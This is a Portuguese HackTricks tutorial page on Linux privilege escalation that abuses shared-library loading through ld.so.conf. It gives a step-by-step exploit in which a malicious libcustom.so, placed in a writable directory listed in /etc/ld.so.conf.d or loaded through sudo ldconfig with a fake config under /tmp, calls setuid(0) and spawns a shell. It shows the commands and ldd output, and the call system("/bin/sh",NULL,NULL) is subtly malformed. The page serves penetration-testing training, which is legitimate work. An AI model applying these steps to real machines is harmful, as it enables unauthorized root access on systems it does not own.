# Exemplo de exploração de privesc ld.so

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Prepare o ambiente

Na seção a seguir, você pode encontrar o código dos arquivos que vamos usar para preparar o ambiente

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Crie** esses arquivos em sua máquina na mesma pasta
2. **Compile** a **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copie** `libcustom.so` para `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilégios de root)
4. **Compile** o **executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifique o ambiente

Verifique se _libcustom.so_ está sendo **carregado** de _/usr/lib_ e que você pode **executar** o binário.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploração

Neste cenário, vamos supor que **alguém criou uma entrada vulnerável** dentro de um arquivo em _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso de escrita).\
**Baixe e compile** o seguinte código dentro desse caminho:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Agora que criamos a **biblioteca maliciosa libcustom dentro do caminho mal configurado**, precisamos esperar por um **reboot** ou que o usuário root execute **`ldconfig`** (_caso você possa executar este binário como **sudo** ou ele tenha o **bit suid** você poderá executá-lo por conta própria_).

Uma vez que isso tenha acontecido, **verifique novamente** de onde o executável `sharevuln` está carregando a biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como você pode ver, está **carregando do `/home/ubuntu/lib`** e se algum usuário executá-lo, um shell será executado:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Observe que neste exemplo não elevamos privilégios, mas modificando os comandos executados e **esperando que o root ou outro usuário privilegiado execute o binário vulnerável**, seremos capazes de elevar privilégios.
{% endhint %}

### Outras má configurações - Mesma vuln

No exemplo anterior, simulamos uma má configuração onde um administrador **definiu uma pasta não privilegiada dentro de um arquivo de configuração em `/etc/ld.so.conf.d/`**.\
Mas existem outras má configurações que podem causar a mesma vulnerabilidade, se você tem **permissões de escrita** em algum **arquivo de configuração** dentro de `/etc/ld.so.conf.d`, na pasta `/etc/ld.so.conf.d` ou no arquivo `/etc/ld.so.conf`, você pode configurar a mesma vulnerabilidade e explorá-la.

## Exploit 2

**Suponha que você tenha privilégios sudo sobre `ldconfig`**.\
Você pode indicar ao `ldconfig` **de onde carregar os arquivos de conf**, então podemos aproveitar isso para fazer o `ldconfig` carregar pastas arbitrárias.\
Então, vamos criar os arquivos e pastas necessários para carregar "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Agora, conforme indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
E finalmente, vamos carregar o caminho e verificar de onde o binário está carregando a biblioteca:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como você pode ver, tendo privilégios sudo sobre `ldconfig`, você pode explorar a mesma vulnerabilidade.**

{% hint style="info" %}
Eu **não encontrei** uma maneira confiável de explorar essa vulnerabilidade se `ldconfig` estiver configurado com o **bit suid**. O seguinte erro aparece: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Referências

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab machine in HTB

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
